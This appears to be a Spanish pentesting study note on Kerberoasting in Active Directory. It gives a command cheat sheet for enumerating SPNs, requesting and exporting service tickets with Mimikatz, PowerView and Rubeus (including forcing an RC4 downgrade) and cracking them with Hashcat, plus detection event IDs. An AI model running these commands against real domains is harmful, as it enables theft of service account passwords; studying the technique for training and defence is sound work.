---
tags:
  - AD
  - kerberos
  - windows
  - attack
---
## Conceptos Clave

* El objetivo es solicitar tickets TGS (Ticket Granting Service) para cuentas de servicio y extraerlos de la memoria para realizar ataques de fuerza bruta offline contra las contraseñas.
* Este vector se enfoca exclusivamente en cuentas de usuario del dominio que tienen un atributo SPN asignado, ignorando las cuentas de máquina (computer accounts).
* Los tickets cifrados con RC4 (tipo 23) son considerablemente más rápidos de crackear offline en comparación con los cifrados mediante AES 128/256 (tipo 17/18).
* En ciertos dominios es posible forzar un "downgrade" de cifrado desde AES hacia RC4 al solicitar el ticket, agilizando enormemente los tiempos de crackeo.

  
## Herramientas Clave

* **setspn.exe**: Binario nativo de Windows utilizado para enumerar SPNs registrados en el dominio.
* **PowerShell (System.IdentityModel)**: Clase de `.NET` nativa que permite solicitar tickets Kerberos TGS para cargarlos directamente en la memoria del entorno.
* **Mimikatz**: Empleado para interactuar con LSASS y exportar los tickets TGS desde la memoria a disco o a consola.
* **PowerView**: Herramienta de enumeración en PowerShell que automatiza la búsqueda de SPNs y permite exportar hashes listos para Hashcat.
* **Rubeus**: Framework avanzado de interacción con Kerberos (en C#) capaz de automatizar el Kerberoasting, solicitar cifrados específicos y filtrar objetivos.
* **[Hashcat](../../../📂%2008%20Herramientas&Cheatsheets/Hashcat.md)**: Herramienta de crackeo offline para obtener la contraseña en texto plano a partir del hash extraído.

  
## Metodología Paso a Paso

  
### Fase 1: Enumeración
El primer paso es consultar el Active Directory para identificar cuentas (enfocándose en usuarios, no equipos) que tengan un Service Principal Name (SPN) registrado. Esta consulta se puede realizar de forma nativa o automatizada.

  
### Fase 2: Solicitud de TGS y Extracción
Se solicita un Service Ticket (TGS) al Key Distribution Center (DC) para las cuentas identificadas. Si el método es manual, este ticket entra en caché de memoria y debe extraerse con herramientas externas. Herramientas automatizadas evitan este intermediario procesando y emitiendo el hash directamente a la consola.

  
### Fase 3: Formateo del Hash
Los tickets extraídos en bruto (ej. formato `.kirbi` o `base64`) deben convertirse a una estructura que el software de crackeo entienda usando utilidades o manipulación de cadenas. Las utilidades modernas omiten este paso formateando la salida de manera automática.

  
### Fase 4: Crackeo Offline
Se exporta el hash o los archivos de hashes hacia la máquina de ataque local, donde se utiliza capacidad computacional local para crackear la contraseña a través de ataques de diccionario.

  
## Cheat Sheet de Comandos

### Metodología Manual
```cmd
# Enumerar todos los SPNs registrados en el dominio

setspn.exe -Q */*
```

```powershell
# Cargar la clase .NET requerida en la sesión de PowerShell
Add-Type -AssemblyName System.IdentityModel

# Solicitar el TGS para el SPN objetivo e insertarlo en memoria
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"
 ```

```cmd
# Habilitar salida en Base64 y exportar tickets usando Mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

```bash
# Limpiar el bloque base64 extraído para eliminar saltos de línea (en máquina atacante Linux)
echo "<BASE64_BLOB>" | tr -d \\n > encoded_file

# Decodificar el bloque limpio hacia formato binario .kirbi
cat encoded_file | base64 -d > <USERNAME>.kirbi

# Extraer el hash base para Hashcat usando script de python
python2.7 kirbi2john.py <USERNAME>.kirbi > crack_file

# Ajustar la sintaxis resultante al formato final reconocido por Hashcat (RC4)
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > <OUTPUT_HASH_FILE>
```

### Automatización con PowerView
```powershell
# Cargar el módulo a la sesión actual
Import-Module .\PowerView.ps1

# Listar las cuentas de usuario (samaccountname) que poseen un SPN
Get-DomainUser * -spn | select samaccountname
  
# Solicitar el TGS de un usuario específico en formato directo para Hashcat
Get-DomainUser -Identity <TARGET_USER> | Get-DomainSPNTicket -Format Hashcat

# Realizar Kerberoasting masivo y exportar todo a un archivo CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<OUTPUT_FILE>.csv -NoTypeInformation
```

### Automatización Avanzada con Rubeus
```powershell
# Listar cuentas vulnerables a Kerberoast y ver tipos de cifrado (sin alertar solicitando tickets)
.\Rubeus.exe kerberoast /stats

# Ejecutar Kerberoasting a un objetivo (nowrap evita cortes de línea en el hash)
.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap 

# Ejecutar ataque filtrando solo usuarios con valor admincount=1 (alto valor)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap 

# Intentar forzar downgrade especificando que solo soportamos RC4
.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap /tgtdeleg
```

### Crackeo con Hashcat
```bash
# Crackear hash tipo RC4 (Identificador: $krb5tgs$23$*) usando modo 13100
hashcat -m 13100 <HASH_FILE> <WORDLIST_PATH>
  
# Crackear hash tipo AES-256 (Identificador: $krb5tgs$18$*) usando modo 19700
hashcat -m 19700 <HASH_FILE> <WORDLIST_PATH>
```

## "Gotchas" y Troubleshooting

* **Formatos de Hashes:** El cifrado estándar RC4 genera hashes que inician con `$krb5tgs$23$*`. Los entornos forzados a usar AES-256 generarán hashes comenzando con `$krb5tgs$18$*`.

* **El Flag /nowrap:** Cuando se usa Rubeus, siempre utiliza el parámetro `/nowrap` para evitar que el string resultante tenga rupturas de columna por base64, lo que facilita el copiado y pegado directo.

* **Downgrade a RC4 fallido en 2019:** El uso del flag `/tgtdeleg` con Rubeus solicita expresamente cifrado RC4. Sin embargo, **esta técnica no es funcional contra Domain Controllers corriendo Windows Server 2019**. Estos controladores siempre devolverán el ticket con el máximo nivel de cifrado que soporte la cuenta objetivo.

* **Revisar msds-supportedencryptiontypes:** Si el valor devuelto para este atributo por Active Directory es `0`, la cuenta usa cifrado RC4 por defecto. Si el valor es `24`, indica que solo acepta y requiere cifrado estricto AES 128/256.

* **Exportación en Mimikatz:** Si se decide omitir el comando `base64 /out:true` antes de ejecutar la lista de exportación, Mimikatz escribirá físicamente en el disco local los archivos `.kirbi`.

* **OPSEC (Detection):** La ejecución masiva de Kerberoasting genera múltiples IDs de evento `4769` (A Kerberos service ticket was requested) y posiblemente `4770`, lo cual puede ser fácilmente detectado por un SOC como comportamiento anómalo.